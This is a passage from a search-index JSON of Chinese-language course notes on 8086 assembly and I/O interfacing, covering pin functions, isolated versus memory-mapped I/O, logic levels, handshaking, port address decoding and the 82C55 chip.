\\(MN/\\bar{MX}\\) \u6307\u793a\uff0c\u5176\u4e2d\u4f4e\u7535\u5e73\u8868\u793a Maximum\uff1a</p> <ul> <li>Minimum Mode: \u6700\u7b80\u5355\u3001\u5f00\u9500\u6700\u5c0f\u7684\u6a21\u5f0f<ul> <li>\u6240\u6709 Memory \u548c I/O \u64cd\u4f5c\u7684\u63a7\u5236\u4fe1\u53f7\u90fd\u7531\u5904\u7406\u5668\u751f\u6210</li> </ul> </li> <li>Maximum Mode: <ul> <li>\u5141\u8bb8\u7cfb\u7edf\u4f7f\u7528\u5916\u90e8\u7684 coprocessor\uff0c\u4f8b\u5982 8087\uff08floating-point coprocessor\uff09</li> <li>\u4e00\u4e9b\u63a7\u5236\u4fe1\u53f7\u53ea\u80fd\u5728\u5916\u90e8\u751f\u6210\uff0c\u9700\u8981\u5916\u90e8\u6570\u636e\u603b\u7ebf\u63a7\u5236</li> </ul> </li> </ul> <p>\u6b64\u5904\u6211\u4eec\u7b80\u8981\u4ecb\u7ecd\u4e00\u4e0b\u90e8\u5206\u5f15\u811a\u7684\u529f\u80fd\uff1a</p> <ul> <li>Pin Connections \\(AD_{15} - AD_0\\)<ul> <li>\u5f53\u5f15\u811a ALE \u4e3a 0 \u65f6\uff0c\u8868\u793a\u8be5\u603b\u7ebf\u4e0a\u4e3a\u6570\u636e\u4fe1\u53f7</li> <li>\u5f53\u5f15\u811a ALE \u4e3a 1 \u65f6\uff0c\u8868\u793a\u8be5\u603b\u7ebf\u4e0a\u4e3a\u5730\u5740\u4fe1\u53f7\uff0c\u5305\u62ec Memory Address \u548c I/O Port Number<ul> <li>\u5177\u4f53\u662f\u5185\u5b58\u8fd8\u662f I/O \u7531\u53e6\u4e00\u4e2a\u5f15\u811a\u7684\u503c\u8fdb\u884c\u5224\u65ad</li> </ul> </li> </ul> </li> <li>Address Latch Enable \\(ALE\\)\uff1a\u53ea\u5728 Minimum Mode \u4e0b\u6709\u6548</li> <li>\\(M/\\bar{IO}\\)\uff1a\u4e3a 0 \u65f6\u8868\u793a\u603b\u7ebf\u4e0a\u4e3a I/O\uff1b\u4e3a 1 \u65f6\u8868\u793a\u603b\u7ebf\u4e0a\u4e3a Memory<ul> <li>\u5728 8088 \u4e2d\u6b63\u597d\u76f8\u53cd\uff0c\u4e3a \\(IO/\\bar M\\)</li> </ul> </li> <li>Bus High Enable \\(BHE\\)\uff1a\u6307\u793a\u6570\u636e\u603b\u7ebf\u4e0a\u9ad8\u5b57\u8282\u662f\u5426\u6709\u6548<ul> <li>\u76f8\u5bf9\u6709\u4e00\u4e2a\u5f15\u811a \\(BLE\\)\uff0c\u4f46\u8be5\u4fe1\u53f7\u4e0d\u9700\u8981\u989d\u5916\u4ea7\u751f\uff0c\u9ed8\u8ba4\u7b49\u4e8e \\(A_0\\)</li> </ul> </li> <li>Read Signal \\(\\bar{RD}\\)\uff1a\u662f\u5426\u5141\u8bb8\u6570\u636e\u603b\u7ebf\u4ece Memory \u6216 I/O \u8bbe\u5907\u4e2d\u8bfb\u53d6\u6570\u636e</li> <li>Write Line \\(\\bar{WR}\\)\uff1a\u6307\u793a\u662f\u5426\u6b63\u5728\u5411 Memory \u6216 I/O \u8bbe\u5907\u4e2d\u8f93\u51fa\u6570\u636e</li> <li>Interrupt Request \\(INTR\\)\uff1a\u5982\u679c INTR \u5728 IF = 1 \u65f6\u4fdd\u6301\u9ad8\u4f4d\uff0c8086/8088 \u5c06\u5728\u5f53\u524d\u6307\u4ee4\u5b8c\u6210\u6267\u884c\u540e\u8fdb\u5165\u4e2d\u65ad\u786e\u8ba4\u5faa\u73af\u3002</li> <li>Non-Maskable Interrupt \\(NMI\\)\uff1a\u4e0e INTR \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u68c0\u67e5 IF\uff0c\u5373\u4e0d\u53ef\u5c4f\u853d\u4e2d\u65ad</li> </ul>"},{"location":"Courses/asm/ch11/#intro-to-io-interface","title":"Intro to I/O Interface","text":"<p>\u786c\u4ef6\u63a5\u53e3\u53ef\u4ee5\u6839\u636e\u5982\u4e0b\u4e09\u79cd\u4f9d\u636e\u8fdb\u884c\u5212\u5206\uff1a</p> <ul> <li>Directions of information flow<ul> <li>Input Interface</li> <li>Output Interface</li> </ul> </li> <li>Types of signal<ul> <li>Analog Interface</li> <li>Digital Interface</li> </ul> </li> <li>Types of data transmission<ul> <li>Serial Interface</li> <li>Parallel Interface</li> <li>\u8fd9\u91cc\u7684\u4e32\u884c\u8868\u793a\u6309\u4f4d\u4f20\u8f93\u6570\u636e\uff0c\u5e76\u884c\u8868\u793a\u6309\u5927\u4e8e\u4f4d\uff08\u6bd4\u5982\u5b57\u8282\uff09\u4f20\u8f93\u6570\u636e</li> </ul> </li> </ul> <p></p> <p>\u5728\u8bbe\u8ba1\u63a5\u53e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c1d\u8bd5\u660e\u786e\u4ee5\u4e0b\u95ee\u9898\uff1a</p> <ul> <li>&lt;1&gt; \u600e\u4e48\u5c06 I/O \u8bbe\u5907\u8fde\u63a5\u5230 CPU\uff1f<ul> <li>\u5bf9\u4e8e\u8f93\u51fa\u63a5\u53e3\uff0c\u4f7f\u7528 Latches</li> <li>\u5bf9\u4e8e\u8f93\u5165\u63a5\u53e3\uff0c\u4f7f\u7528 Three State Buffers</li> </ul> </li> <li>&lt;2&gt; \u600e\u4e48\u4e3a I/O \u8bbe\u5907\u63d0\u4f9b Address Space\uff1f<ul> <li>\u6709\u4e24\u79cd Schemes\uff1aIsolated I/O \u548c Memory Mapped I/O</li> </ul> </li> <li>&lt;3&gt; \u600e\u4e48\u6267\u884c I/O Port Decoding\uff1f<ul> <li>\u8fd9\u4e00\u8fc7\u7a0b\u9700\u8981\u6d89\u53ca\u4fe1\u53f7 Memory Address, BHE, BLE, IORC, IOWC</li> </ul> </li> <li>&lt;4&gt; \u600e\u4e48\u5b9e\u73b0\u5904\u7406\u5668\u548c I/O \u8bbe\u5907\u7684\u540c\u6b65\uff1f<ul> <li>unconditional transfer, strobing, handshaking, polling, interrupt-driven, channel-based(e.g. DMA)...</li> </ul> </li> </ul> <p>Isolated I/O \u4f7f\u7528 <code>IN</code> \u548c <code>OUT</code> \u6307\u4ee4\u6765\u505a\u6570\u636e\u7684\u4f20\u8f93\uff0c\u8fd9\u91cc\u7684 isolated \u610f\u6307 I/O \u5730\u5740\u7a7a\u95f4\u662f\u548c\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u9694\u79bb\u7684\uff0c\u79f0\u4e3a port\u3002</p> <ul> <li>Advantage<ul> <li>port \u662f\u9694\u79bb\u7684\uff0c\u4e0d\u9700\u8981\u4e3a\u8bbe\u5907\u5360\u7528 Memory Address</li> </ul> </li> <li>Disadvantage<ul> <li>\u53ea\u80fd\u901a\u8fc7 <code>IN</code> \u548c <code>OUT</code> \u6307\u4ee4\u8fdb\u884c\u6570\u636e\u4ea4\u6362</li> <li>\u9700\u8981\u5bf9 I/O Space \u989d\u5916\u4ea7\u751f\u63a7\u5236\u4fe1\u53f7</li> <li>\u9700\u8981\u7279\u5b9a\u7684 I/O Instruction\uff0c\u5bfc\u81f4\u7f16\u7a0b\u66f4\u52a0\u590d\u6742</li> </ul> </li> </ul> <p>\u800c Memory-Mapped I/O \u5141\u8bb8\u4efb\u610f\u6307\u4ee4\u8fdb\u884c\u6570\u636e\u4ea4\u6362\uff0cI/O \u8bbe\u5907\u5c06\u5171\u4eab\u5185\u5b58\u7a7a\u95f4\uff1a</p> <ul> <li>Advantage<ul> <li>I/O \u64cd\u4f5c\u901f\u5ea6\u4e0e\u8bbf\u5b58\u64cd\u4f5c\u7b49\u4ef7</li> <li>\u7b80\u5316\u4e86\u7f16\u7a0b\u96be\u5ea6</li> </ul> </li> <li>Disadvantage<ul> <li>\u5360\u7528\u4e86\u5927\u91cf Memory Address\uff0c\u5e76\u4e14\u53ef\u80fd\u7a7a\u95f4\u4e0d\u591f\u5bfb\u5740\u6240\u6709 I/O \u8bbe\u5907</li> <li>\u5982\u679c\u4e00\u4e2a\u8bbe\u5907\u54cd\u5e94\u65f6\u95f4\u5f88\u6162\uff0c\u5b83\u4f1a\u62d6\u7d2f CPU \u8bbf\u95ee\u5185\u5b58\u7684\u65f6\u95f4\uff0c\u5bfc\u81f4\u6574\u4f53\u6027\u80fd\u4e0b\u964d</li> </ul> </li> </ul> <p>PC \u4f7f\u7528 Isolated I/O\uff0c\u800c\u4e0d\u4f7f\u7528 Memory-Mapped I/O</p> <p>\u5728\u786c\u4ef6\u4e0a\uff0cTTL \u548c CMOS \u662f\u6700\u5e38\u89c1\u7684\u4e24\u79cd\u903b\u8f91\u7ba1\uff0c\u5176\u4e2d CMOS \u7531\u4e8e\u6d88\u8017\u66f4\u5c11\u80fd\u91cf\u3001\u901f\u5ea6\u66f4\u5feb\u800c\u5f97\u5230\u4e86\u66f4\u5e7f\u6cdb\u7684\u5e94\u7528\u3002\u5bf9\u4e8e\u5b83\u4eec\u7684\u8f93\u5165\u548c\u8f93\u51fa\u7684\u903b\u8f91\u7535\u5e73\uff0c\u6709\u5982\u4e0b\u89c4\u5b9a\u6807\u51c6\uff1a</p> TTL Logic LevelsCMOS Logic Levels <p></p> <p>TTL \u901a\u5e38\u662f 5V\uff0c\u4f46\u662f\u4e3a\u4e86\u548c CMOS \u517c\u5bb9\u4e5f\u6709 3.3V \u7684\u7248\u672c</p> <p></p> <p>CMOS \u7684 VCC \u53ef\u4ee5\u662f 5V, 3.3V, 1.8V</p> <p>\u603b\u7ed3\u5f97\u5230\u4e0b\u8868\uff1a</p> <p></p> <p>\u4e0a\u8868\u4e0b\u65b9\u6709\u4e24\u4e2a\u4f8b\u5b50\uff0c\u5176\u4e2d\u5de6\u4f8b TTL \u7684\u8f93\u51fa\u7535\u5e73\u4e0d\u6ee1\u8db3 CMOS \u7684\u8f93\u5165\u7535\u5e73\u8981\u6c42\uff0c\u5373 \\(VOHmin &gt; VIHmin, VOLmax &lt; VILmax\\)\u3002</p> <p>\u5bf9\u4e8e\u8f93\u5165\u8bbe\u5907\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u8bc1\u7535\u5e73\u5339\u914d\u3001\u4fe1\u53f7\u7a33\u5b9a\u5373\u53ef\u5f97\u5230\u5bf9\u5e94\u7684\u903b\u8f91\u4fe1\u53f7\uff0c\u901a\u5e38\u4f7f\u7528\u4e09\u6001\u95e8\u4f5c\u4e3a\u4e2d\u4ecb\uff1b\u800c\u8f93\u51fa\u8bbe\u5907\u8fd8\u9700\u8981\u4fdd\u8bc1\u7535\u6d41\u5927\u5c0f\u8db3\u591f\u9a71\u52a8\u8f93\u51fa\u8bbe\u5907\u3002</p> <p>\u5b9e\u9645\u63a7\u5236\u4e2d\uff0c\u6211\u4eec\u8981\u901a\u8fc7\u8bbe\u7f6e\u5408\u7406\u7684\u7535\u963b\u503c\u6765\u83b7\u5f97\u989d\u5b9a\u7535\u6d41\uff0c\u6211\u4eec\u4ee5\u4e00\u4e2a LED \u706f\u4e3a\u4f8b\uff1a</p> <p></p> <p>\u5df2\u77e5\u8be5\u4e09\u6781\u7ba1\u57fa\u6781\u548c\u96c6\u7535\u6781\u7684\u7535\u6d41\u5927\u5c0f\u6bd4\u4f8b\u4e3a 1:100\u3002\u5bf9\u4e8e Logic 1\uff0c\u6211\u4eec\u8f93\u5165\u7684\u7535\u538b\u5e45\u5ea6\u5728 2.4V - 5V \u8303\u56f4\u5185\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u4fdd\u8bc1\u5bf9\u4e8e 2.4V \u7684\u8f93\u5165\u4e5f\u80fd\u9a71\u52a8\u8be5 LED \u706f\uff0c\u5219\u5bf9\u57fa\u6781\u548c\u96c6\u7535\u6781\u7684\u7535\u963b\u8bbe\u7f6e\u8ba1\u7b97\u5982\u4e0a\u3002</p> <p>\u66f4\u4e00\u822c\u7684\u611f\u6027\u8d1f\u8f7d\u7535\u673a\u8bbe\u5907\u4e2d\u5b58\u5728\u5f88\u591a\u7535\u611f\uff0c\u5728\u6211\u4eec\u65ad\u7535\u77ac\u95f4\u4f1a\u4ea7\u751f\u53cd\u5411\u7535\u52a8\u52bf\u3002\u5982\u679c\u4e0d\u5bf9\u8be5\u53cd\u5411\u7535\u52a8\u52bf\u8fdb\u884c\u5904\u7406\uff0c\u9ad8\u989d\u7535\u538b\u53ef\u80fd\u4f1a\u635f\u574f\u4e09\u6781\u7ba1\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5728\u4e09\u6781\u7ba1\u4e24\u7aef\u589e\u52a0\u7a33\u538b\u7ba1\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u8f93\u51fa\u8bbe\u5907\uff0c\u8f93\u51fa\u7684\u4fe1\u53f7\u8fd8\u9700\u8981\u8fdb\u884c\u9501\u5b58\uff0c\u56e0\u4e3a\u8f93\u51fa\u7684\u4fe1\u53f7\u662f\u6301\u7eed\u6027\u7684\u3002\u63a7\u5236\u4fe1\u53f7\u6b64\u65f6\u4e0d\u518d\u63a5\u5165\u4f7f\u80fd\u4fe1\u53f7\uff0c\u800c\u662f\u63a5\u5165\u65f6\u949f\u4fe1\u53f7\uff1b\u5f53\u6211\u4eec\u4f7f\u7528\u6307\u4ee4 <code>OUT 38H, AL</code> \u65f6\uff0c\u65f6\u949f\u4fe1\u53f7\u5c31\u4f1a\u53d1\u751f\u4e00\u6b21\u8df3\u53d8\uff0c\u5c06\u6211\u4eec\u8f93\u51fa\u4fe1\u53f7\u8fdb\u884c\u9501\u5b58\u4fdd\u5b58\u3002</p> <p>\u5bf9\u4e8e\u6253\u5370\u673a\u7b49\u66f4\u201c\u667a\u80fd\u201d\u7684\u8bbe\u5907\uff0c\u6211\u4eec\u8fd8\u8981\u6c42 CPU \u80fd\u591f\u548c\u5916\u90e8\u8bbe\u5907\u8fdb\u884c\u5f02\u6b65\u6570\u636e\u4f20\u8f93\uff0c\u5e38\u89c1\u6709\u5982\u4e0b\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>Strobing \u9009\u901a\uff0c\u5355\u5411\u63a7\u5236\u4fe1\u53f7</li> <li>Handshaking \u63e1\u624b\uff0c\u53cc\u5411\u63a7\u5236\u4fe1\u53f7</li> </ul> <p>Strobing</p> <p>Strobing \u5206\u4e3a source-initiated transfer \u548c destination-initiated transfer \u4e24\u79cd\uff1a</p> source-initiated transferdestination-initiated transfer <p></p> <ul> <li>source \u5148\u5c06\u6570\u636e\u5199\u5165 Data Bus\uff0c\u7136\u540e\u8bbe\u7f6e\u63a7\u5236\u4fe1\u53f7 Strobe \u4e3a 1</li> <li>destination \u8bfb\u53d6\u6570\u636e\u5230\u5bc4\u5b58\u5668\u4e2d</li> <li>source \u8bbe\u7f6e\u63a7\u5236\u4fe1\u53f7 Strobe \u4e3a 0</li> <li>source \u4ece Data Bus \u4e2d\u79fb\u9664\u6570\u636e</li> </ul> <p></p> <ul> <li>destination \u8bbe\u7f6e\u63a7\u5236\u4fe1\u53f7 Strobe \u4e3a 1</li> <li>source \u5c06\u6570\u636e\u5199\u5165 Data Bus</li> <li>destination \u6355\u83b7\u5230\u6570\u636e\u5e76\u5199\u5165\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u8bbe\u7f6e\u63a7\u5236\u4fe1\u53f7 Strobe \u4e3a 0</li> <li>source \u4ece Data Bus \u4e2d\u79fb\u9664\u6570\u636e</li> </ul> <p>\u9009\u901a\u65b9\u5f0f\u597d\u5904\u5728\u4e8e\u7b80\u5355\uff0c\u574f\u5904\u5728\u4e8e\u96be\u4ee5\u63a7\u5236\u8fde\u63a5\u65f6\u95f4\u3002</p> <p>Handshaking</p> <p>\u73b0\u5728\u7a0d\u5fae\u590d\u6742\u70b9\u7684\u8bbe\u5907\u90fd\u91c7\u7528\u53cc\u5411\u4fe1\u53f7\uff0c\u4e24\u6761\u63a7\u5236\u7ebf\u5206\u522b\u7528\u4e8e Request \u548c Reply\u3002</p> source-initiated transferdestination-initiated transfer <p></p> <ul> <li>source \u5148\u5c06\u6570\u636e\u5199\u5165 Data Bus\uff0c\u7136\u540e\u8bbe\u7f6e request</li> <li>destination \u8bfb\u53d6\u6570\u636e\u5230\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u8bbe\u7f6e reply</li> <li>source \u4ece Data Bus \u4e2d\u79fb\u9664\u6570\u636e\uff0c\u5e76\u4e14\u91cd\u7f6e request</li> <li>destination \u91cd\u7f6e reply</li> </ul> <p></p> <ul> <li>destination \u8bbe\u7f6e request</li> <li>source \u5c06\u6570\u636e\u5199\u5165 Data Bus\uff0c\u7136\u540e\u8bbe\u7f6e reply</li> <li>destination \u6355\u83b7\u5230\u6570\u636e\u5e76\u5199\u5165\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u91cd\u7f6e request</li> <li>source \u4ece Data Bus \u4e2d\u79fb\u9664\u6570\u636e\uff0c\u5e76\u4e14\u91cd\u7f6e reply</li> </ul> <p>\u5982\u4e0b\u4f8b\u5b50\u5c55\u793a\u4e86 PC \u548c\u4e00\u4e2a Printer \u4e4b\u95f4\u7684\u6570\u636e\u4ea4\u6362\u8fc7\u7a0b\uff0cASCII \u6570\u636e\u88ab\u653e\u7f6e\u5728 \\(D_7- D_0\\) \u4e2d\uff0c\u5411 port <code>PRINTER</code> \u53d1\u9001\u6570\u636e\u5c31\u76f8\u5f53\u4e8e request\uff1b\u6253\u5370\u673a\u6536\u5230\u6570\u636e\u540e\u8bbe\u7f6e port <code>BUSY</code> \u4e3a 1 \u5c31\u76f8\u5f53\u4e8e reply\uff1a</p> <p></p>"},{"location":"Courses/asm/ch11/#io-port-address-decoding","title":"I/O Port Address Decoding","text":"<p>\u5f80\u5e74\u6ca1\u8003\uff0c\u4eca\u5e74\u5fc5\u8003</p> <p></p> <p>\u8fd9\u91cc\u7684 <code>81H</code> \u65e2\u51b3\u5b9a\u4e86\u7aef\u53e3\uff0c\u53c8\u51b3\u5b9a\u4e86\u8be5\u6307\u4ee4\u662f I/O \u8fd8\u662f Memory\uff08\u5b9e\u9645\u5bf9\u4e8e <code>IN</code> \u548c <code>OUT</code> \u6307\u4ee4\u90fd\u662f I/O\uff09</p> <p>\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f\u5de6\u4fa7\u90e8\u5206\u5bf9 I/O Port \u5730\u5740\u7684\u8bd1\u7801\u3002CPU \u7684 I/O \u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528 8-bit \u5730\u5740\uff0c\u8303\u56f4\u4e3a <code>00H-FFH</code>\uff0c\u6240\u4ee5\u8fd9\u79cd\u6307\u4ee4\u7684\u5730\u5740\u7ebf\u53ea\u4f1a\u7528\u5230 \\(A_7 -A_0\\)\u3002</p> <p>\u4e0d\u8fc7\u5b9e\u9645\u4e0a\uff0cPC \u5b9e\u9645 I/O \u7aef\u53e3\u90fd\u662f 16-bit \u5730\u5740\uff08<code>0-FFFFH</code>\uff09\uff0c\u6211\u4eec\u901a\u8fc7\u5bc4\u5b58\u5668 <code>DX</code> \u6307\u5b9a\u7aef\u53e3\uff0c\u7406\u8bba\u4e0a\u4f1a\u5bf9 \\(A_{15}- A_0\\) \u5b8c\u6574\u89e3\u7801\u3002</p> <p>\u4ee5 8-bit \u5730\u5740\u4e3a\u4f8b\uff0c\u5176\u4e2d\u9ad8\u4e94\u4f4d\u7528\u4e8e\u9009\u62e9\u8bd1\u7801\u5668\uff08\u8bd1\u7801\u5668\u4f7f\u80fd\uff09\uff0c\u4f4e\u4e09\u4f4d\u7528\u4e8e\u8bd1\u7801\u8f93\u5165\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a 3-to-8 Decoder\uff0c\u5176\u7ed3\u6784\u5982\u672c\u8282\u5f00\u59cb\u7684\u56fe\u4e2d\u5de6\u4fa7\u90e8\u5206\u6240\u793a\u3002</p> <p>\u6839\u636e\u56fe\u8bc6\u522b\u8be5\u8bbe\u5907\u5730\u5740\u8bd1\u7801\u7684\u8303\u56f4</p> <p>\u53ea\u6709\u8bd1\u7801\u5668\u4f7f\u80fd\u5168\u4e3a 1\uff0c\u624d\u80fd\u542f\u7528\u8be5\u5730\u5740\u8bd1\u7801\u5668\uff1b\u4f8b\u5982\u4e0b\u56fe\u8981\u6c42 \\(A_3 - A_7\\) \u4e3a <code>11110</code>\uff08\u6ce8\u610f\u975e\u95e8\u662f\u4e00\u4e2a\u5708\uff09</p> <p></p> \u5bf9\u4e8e 16-bit \u7684\u5730\u5740\uff0c\u4f7f\u7528\u786c\u4ef6 PLD <p>\u4e0b\u56fe\u662f\u4e00\u4e2a\u53ef\u7f16\u7a0b\u786c\u4ef6\uff0c\u56e0\u6b64 \\(A_{11}- A_{15}\\) \u4e5f\u662f\u4f5c\u4e3a\u8bd1\u7801\u5668\u4f7f\u80fd\u8f93\u5165\u8fdb\u5165\u7684</p> <p></p> <p>\u6211\u4eec\u7684\u6570\u636e\u603b\u7ebf\u901a\u5e38\u4e3a 16-bit\uff0c\u4f46\u5f80\u5f80\u53ea\u6709 8-bit \u6709\u6548\u3002\u5728 16-bit \u5fae\u5904\u7406\u5668\uff08\u5982 80386SX\uff09\u91cc\uff1a</p> <ul> <li>\u5185\u5b58\u662f 16-bit data bus \u2192 \u7531 \u4e24\u4e2a 8-bit memory bank \u7ec4\u6210 (High bank + Low bank)</li> <li>I/O \u7a7a\u95f4\u4e5f\u662f\u4e00\u6837\uff01 \u2192 \u7531 \u4e24\u4e2a 8-bit I/O bank \u7ec4\u6210\uff1a</li> </ul> Bank \u6570\u636e\u7ebf \u5730\u5740\u4f8b\u5b50 \u4f4e\u5b57\u8282 (Low bank) D7\u2013D0 \u5076\u6570\u7aef\u53e3 (40h) \u9ad8\u5b57\u8282 (High bank) D15\u2013D8 \u5947\u6570\u7aef\u53e3 (41h) <pre><code>OUT  AL, 40H   ; \u5199\u4f4e\u4f4d bank\uff0cBLE = 0\uff0c\u5199\u5165  D7-D0\nOUT  AL, 41H   ; \u5199\u9ad8\u4f4d bank\uff0cBHE = 0\uff0c\u5199\u5165 D15-D8\n</code></pre> <p><code>BHE</code> \u548c <code>BLE</code> \u662f\u4e24\u4e2a\u5199\u9009\u901a\u4fe1\u53f7\uff0c\u5176\u4e2d <code>BLE</code> \u76f4\u63a5\u8bbe\u7f6e\u4e3a \\(A_0\\)\uff0c\u5bf9 I/O \u8bbe\u5907\u8fdb\u884c\u4e00\u4e2a 8 \u4f4d\u5199\u5165\u5fc5\u987b\u660e\u786e\u5b83\u8981\u5199\u54ea\u4e00\u534a\u3002\u800c 8-bit I/O Read \u4e0d\u9700\u8981\u8fd9\u4e24\u4e2a\u4fe1\u53f7\uff0cCPU \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u5730\u5740\u6700\u4f4e\u4f4d \\(A_0\\) \u6765\u9009\u62e9\u8bfb\u53d6\u54ea\u4e2a\u5b57\u8282\uff1a</p> <ul> <li>\\(\\overline{BHE}\\) (Bus High Enable): \u5f53\u8be5\u4fe1\u53f7\u4e3a\u4f4e\u7535\u5e73\uff080\uff09\u65f6\uff0c\u8868\u793a\u542f\u7528\u9ad8\u4f4d\u6570\u636e\u603b\u7ebf (\\(D_{15}-D_8\\))\u3002</li> <li>\\(A_0\\) (Address line 0): \u5f53\u8be5\u4fe1\u53f7\u4e3a\u4f4e\u7535\u5e73\uff080\uff09\u65f6\uff0c\u8868\u793a\u542f\u7528\u4f4e\u4f4d\u6570\u636e\u603b\u7ebf (\\(D_7-D_0\\))\u3002</li> </ul> <p></p> \u4e3a\u4ec0\u4e48 8-bit \u5199\u5165\u9700\u8981\u4e24\u4e2a\u4fe1\u53f7\uff1f <p>\u56e0\u4e3a\u6570\u636e\u901a\u9053\u548c\u5730\u5740\u901a\u9053\u90fd\u662f 16-bit \u7684\uff0c\u5373 \\(AD_{15}- AD_0\\)\uff0c\u800c\u201c\u5199\u201d\u8fd9\u4e00\u64cd\u4f5c\u5177\u6709\u7834\u574f\u6027\uff0c\u56e0\u6b64\u4e0d\u80fd\u53ea\u9760\u4f4e\u4f4d \\(A_0\\) \u7684\u5947\u5076\u6765\u5224\u65ad\u662f\u9ad8\u4f4d\u8fd8\u662f\u4f4e\u4f4d\u3002</p> <p>Example</p> <ul> <li>\u5f53\u8bbf\u95ee\u5730\u5740 <code>41H</code> \u65f6\uff0c\u8bd1\u7801\u5668\u7684\u8f93\u5165\u4e3a \\(\\overline{BHE}=0, \\overline{IOWC}=0, A_0=1\\)</li> <li>\u5f53\u8bbf\u95ee\u5730\u5740 <code>40H</code> \u65f6\uff0c\u8bd1\u7801\u5668\u7684\u8f93\u5165\u4e3a \\(\\overline{BHE}=1, \\overline{IOWC}=0, A_0=0\\)</li> <li>\u4f46\u5bf9\u4e8e 16L8 \u8fd9\u79cd\u53ef\u7f16\u7a0b\u786c\u4ef6\uff0c\\(O_1 -O_8\\) \u7684\u8f93\u51fa\u5e76\u4e0d\u4e00\u5b9a\u662f\u6839\u636e 3-to-8 \u8bd1\u7801\u5668\u90a3\u6837\u76f4\u63a5\uff0c\u53ea\u9700\u8981\u77e5\u9053\u5bf9\u4e8e\u8be5\u56fe\u5982\u679c \\(\\overline{BHE}\\) \u7f6e 0 \u5219\u8bbf\u95ee high bank \u5373\u53ef</li> </ul> <p></p> \u5bf9\u4e8e 16-bit port\uff082-byte aligned\uff09\uff0c\u4e00\u6b21\u5199\u5165 16-bit \u6570\u636e\uff0c\u4e0d\u518d\u9700\u8981 \\(\\overline{BHE}\\) \u548c \\(A_0\\) <p></p>"},{"location":"Courses/asm/ch11/#programmable-peripheral","title":"Programmable Peripheral","text":"<p>\u672c\u8282\u4ecb\u7ecd\u4e09\u4e2a\u7ecf\u5178\u7684\u5916\u90e8\u53ef\u7f16\u7a0b\u5668\u4ef6\u3002</p>"},{"location":"Courses/asm/ch11/#82c55","title":"82C55","text":"<p>Quote</p> <p></p> <p>\u82af\u7247 82C55 \u63d0\u4f9b\u4e86\u53ef\u7f16\u7a0b\u63a5\u53e3\uff1a</p> <ul> <li>\u5b83\u63d0\u4f9b 24 \u6761\u53ef\u7f16\u7a0b I/O \u5f15\u811a\uff0c\u5176\u4e2d <code>82</code> \u8868\u793a\u662f\u5916\u90e8\u53ef\u7f16\u7a0b\u5668\u4ef6\uff0c<code>C</code> \u8868\u793a\u662f CMOS \u4f4e\u529f\u8017\u7248\u672c\uff0c<code>55</code> \u662f\u6d41\u6c34\u53f7\uff0c\u901a\u5e38\u8d8a\u5927\u8d8a\u65b0</li> <li>\u5206\u6210 A\u3001B\u3001C \u4e09\u4e2a\u7aef\u53e3\uff0c\u6bcf\u4e2a\u7aef\u53e3\u90fd\u662f 8-bit\uff0c\u5176\u4e2d A\u3001B \u53e3\u7528\u4e8e\u6570\u636e\u4f20\u8f93\uff0cC \u53e3\u7528\u4e8e\u63a7\u5236\u4fe1\u53f7<ul> <li>\u4e09\u4e2a\u7aef\u53e3\u8d44\u6e90\u4e0d\u5e73\u7b49\uff0c\u5176\u4e2d Port A \u548c Port C \u90fd\u6709 Output Latch/Buffer \u4ee5\u53ca Input Buffer\uff0c\u800c Port B \u53ea\u6709 Output/Input Shared Latch/Buffer\uff0c\u56e0\u6b64\u53ea\u6709 Group A \u53ef\u4ee5\u540c\u65f6\u8f93\u5165\u8f93\u51fa\uff08\u8fd0\u884c\u5728 Mode 2 \u4e0b\uff09</li> <li>\u5b9e\u9645\u5904\u7406\u4e2d\u5c06\u4e09\u4e2a\u7aef\u53e3\u5206\u4e3a\u4e24\u4e2a Group \u8bbe\u7f6e\uff1a</li> <li>Group A\uff1aPort A(<code>PA7-PA0</code>) &amp; Half Port C(<code>PC7-PC4</code>)</li> <li>Group B\uff1aPort B(<code>PB7-PB0</code>) &amp; Half Port C(<code>PC3-PC0</code>)</li> </ul> </li> <li>\u53ef\u4ee5\u8bbe\u7f6e\u4e3a \u4e0d\u540c\u6a21\u5f0f\uff08Mode 0/1/2\uff09<ul> <li>Mode 0\uff1aBasic I/O Operation\uff08for group A &amp; B\uff09\u5141\u8bb8\u8bbe\u7f6e\u7aef\u53e3\u662f\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u540c\u65f6\u667a\u80fd\u505a\u4e00\u4ef6\u4e8b</li> <li>Mode 1\uff1aStrobe I/O Operation\uff08for group A &amp; B\uff09\u65b0\u589e\u53cc\u5411\u9009\u901a\u4fe1\u53f7\uff0c\u8003\u8651\u5916\u90e8\u8bbe\u5907\u72b6\u6001</li> <li>Mode 2\uff1aBidirectional Bus Operation\uff08for group A only\uff09\u5141\u8bb8\u540c\u65f6\u8f93\u5165\u8f93\u51fa<ul> <li>\u5373\u53ea\u6709 Group A \u5141\u8bb8\u5de5\u4f5c\u5728\u6a21\u5f0f 2 \u4e0b\uff0cPort C \u5bbd\u5ea6\u4e0d\u591f\u8ba9 Group B \u4e5f\u5de5\u4f5c\u5728\u53cc\u5de5\u4e0b</li> </ul> </li> </ul> </li> <li>\u5728 PC \u91cc\u5e38\u7528\u6765\u8fde\u63a5 \u952e\u76d8\u3001\u5e76\u53e3\u3001\u626c\u58f0\u5668\u3001\u5b9a\u65f6\u5668 \u7b49\u8bbe\u5907<ul> <li>\u901a\u8fc7 I/O \u7aef\u53e3\uff08\u5982 60H\u3001378H\uff09\u8fdb\u884c\u8bfb\u5199</li> </ul> </li> <li>\u9700\u8981\u901a\u8fc7 A0/A1 \u6307\u5b9a\u8bbf\u95ee\u7aef\u53e3 A/B/C \u6216\u63a7\u5236\u5bc4\u5b58\u5668<ul> 